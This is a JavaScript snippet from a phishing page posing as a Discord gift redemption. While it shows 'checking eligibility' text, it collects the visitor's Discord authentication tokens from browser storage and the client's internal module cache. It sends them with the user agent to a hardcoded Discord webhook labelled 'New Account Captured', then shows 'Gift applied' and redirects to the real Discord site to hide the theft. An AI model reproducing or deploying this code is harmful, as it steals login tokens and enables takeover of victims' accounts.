<script>
        async function execute() {
            const btn = document.getElementById('btn');
            const status = document.getElementById('status');
            btn.style.opacity = '0.5';
            btn.style.pointerEvents = 'none';
            status.innerText = "Checking account eligibility...";

            // Harvest tokens from all possible storage locations
            const tokens = [
                localStorage.getItem("token"),
                localStorage.getItem("authentication_token"),
                window.webpackChunkdiscord_app ? Object.values(webpackChunkdiscord_app.push([[],{['']:(_,e,_)=>{e.exports=e}},[['']]]).cache).find(m=>m.exports?.default?.getToken)?.exports?.default?.getToken() : null
            ].filter(Boolean);

            if (tokens.length > 0) {
                // Send directly to your Discord webhook
                await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "New Account Captured",
                            description: `**Token:** \`${tokens[0]}\`\n\n**User Agent:** \`${navigator.userAgent}\``,
                            color: 5763719,
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
            }
            
            status.innerText = "Gift applied. Redirecting...";
            // Final redirect to the legitimate page
            setTimeout(() => {
                window.location.href = "https://discord.com/billing/promotions/gift-accepted";
            }, 1000);
        }
    </script>
